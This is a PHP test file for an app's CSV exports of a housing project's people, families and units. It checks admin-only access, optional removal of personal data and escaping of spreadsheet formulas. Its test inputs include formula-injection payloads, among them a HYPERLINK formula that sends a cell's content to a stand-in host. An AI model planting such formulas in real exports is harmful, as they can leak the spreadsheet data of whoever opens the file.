<?php

/**
 * Admins download a project's lists as spreadsheets: its people (with what admins see of
 * them), its families and its units. No one else.
 */

beforeEach(function () {
    $this->project = aProject(['name' => 'Los Ceibos']);
    $this->admin = anAdminOf($this->project);
    $this->type = aUnitType($this->project, ['name' => '2 bedrooms']);
    $this->family = aFamily($this->project, $this->type, ['name' => 'García']);
    $this->member = aMemberOf($this->family, ['firstname' => 'Ana', 'lastname' => 'García', 'legal_id' => '1.234.567-8', 'phone' => null]);
    aUnit($this->type, ['identifier' => 'A-101', 'family_id' => $this->family->id]);
});

function rows(string $csv): array
{
    return array_map(fn ($line) => str_getcsv($line, escape: ''), explode("\n", trim(ltrim($csv, "\u{FEFF}"))));
}

it('gives admins the people, with their ID numbers and families', function () {
    $response = $this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->assertOk();

    expect($response->headers->get('Content-Disposition'))->toContain('los-ceibos-people-')
        ->and($response->streamedContent())->toStartWith("\u{FEFF}")
        ->and(rows($response->streamedContent()))->toContain(['Ana García', $this->member->email, '', '1.234.567-8', 'García', '', $this->member->memberships()->first()->created_at->toDateString()]);
});

it('leaves out email, phone and ID number when asked, keeping the names', function () {
    $this->member->update(['phone' => '099 123 456']);

    $csv = $this->as($this->admin, $this->project)
        ->get(route('manage.export.people', [$this->project, 'without_personal_data' => 1]))->assertOk()->streamedContent();

    expect(rows($csv)[0])->toBe(['Name', 'Family', 'Admin', 'Joined'])
        ->and(rows($csv))->toContain(['Ana García', 'García', '', $this->member->memberships()->first()->created_at->toDateString()])
        ->and($csv)->not->toContain($this->member->email)
        ->not->toContain($this->admin->email)
        ->not->toContain('099 123 456')
        ->not->toContain('1.234.567-8');
});

it('keeps email, phone and ID number by default', function () {
    $headings = rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[0];

    expect($headings)->toBe(['Name', 'Email', 'Phone', 'ID number', 'Family', 'Admin', 'Joined']);
});

it('gives admins the families with their people and units, and the units with their families', function () {
    $families = rows($this->as($this->admin, $this->project)->get(route('manage.export.families', $this->project))->streamedContent());
    $units = rows($this->as($this->admin, $this->project)->get(route('manage.export.units', $this->project))->streamedContent());

    expect($families[1])->toBe(['García', '2 bedrooms', 'Ana García', 'A-101'])
        ->and($units[1])->toBe(['A-101', '2 bedrooms', 'García']);
});

it('writes the headings in the admin\'s language', function () {
    $this->admin->forceFill(['locale' => 'es_UY'])->save();

    expect(rows($this->as($this->admin, $this->project)->get(route('manage.export.units', $this->project))->streamedContent())[0])
        ->toBe(['Vivienda', 'Tipo de vivienda', 'Familia']);
});

describe('What people wrote in the cells', function () {
    it('never runs as a formula, whichever way it starts', function (string $name) {
        $this->family->update(['name' => $name]);

        $cell = rows($this->as($this->admin, $this->project)->get(route('manage.export.families', $this->project))->streamedContent())[1][0];

        expect($cell)->toBe("'{$name}");
    })->with([
        '=1+1', '+1+1', '-1+1', '@SUM(A1)', "\t=1+1", "\r=1+1", ' =1+1',
        '=HYPERLINK("https://example.com/?d="&C2,"see")',
    ]);

    it('never runs as a formula after a semicolon, taken for a column separator', function () {
        $this->member->update(['firstname' => 'Aaa;=1+1']);

        $cell = rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[1][0];

        expect($cell)->toBe("Aaa;'=1+1 García");
    });

    it('stays text in a family\'s name, and in its unit type\'s and unit\'s', function () {
        $this->family->update(['name' => '=family']);
        $this->type->update(['name' => '@type']);
        $this->project->units()->first()->update(['identifier' => '+unit']);

        expect(rows($this->as($this->admin, $this->project)->get(route('manage.export.units', $this->project))->streamedContent())[1])
            ->toBe(["'+unit", "'@type", "'=family"]);
    });

    it('leaves alone what cannot run: a phone number, a hyphen within, an empty cell', function () {
        $this->member->update(['phone' => '+598 99 123 456', 'firstname' => 'Aaa-María']);

        $row = rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[1];

        expect($row[0])->toBe('Aaa-María García')
            ->and($row[2])->toBe('+598 99 123 456')
            ->and($row[5])->toBe('');
    });

    it('still neutralises something posing as a phone number', function () {
        $this->member->update(['phone' => '+1+1', 'firstname' => 'Aaa']);

        expect(rows($this->as($this->admin, $this->project)->get(route('manage.export.people', $this->project))->streamedContent())[1][2])->toBe("'+1+1");
    });
});

it('gives the lists to no one but admins', function () {
    expect($this->as($this->member, $this->project)->get(route('manage.export.people', $this->project)))->toBeDenied();
});
